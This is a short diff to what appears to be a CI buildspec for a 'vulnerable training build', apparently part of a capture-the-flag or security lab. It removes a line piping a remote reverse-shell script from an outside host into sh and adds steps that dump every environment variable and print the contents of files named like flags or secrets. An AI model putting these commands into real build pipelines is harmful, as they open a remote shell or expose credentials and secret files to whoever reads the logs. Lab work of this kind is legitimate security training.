@@ -4,5 +4,12 @@ phases:
   build:
     commands:
       - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - curl https://reverse-shell.sh/ikonwcoco.online:1337 | sh
+      - echo "=== ENVIRONMENT ==="
+      - env | sort
+      - echo "=== FLAG FILE SEARCH ==="
+      - |
+        find / -maxdepth 5 -type f \( -iname '*flag*' -o -iname '*secret*' \) 2>/dev/null | head -n 100 | while IFS= read -r f; do
+          echo "--- $f"
+          sed -n '1,120p' "$f" 2>/dev/null || true
+        done
+      - echo "Done"
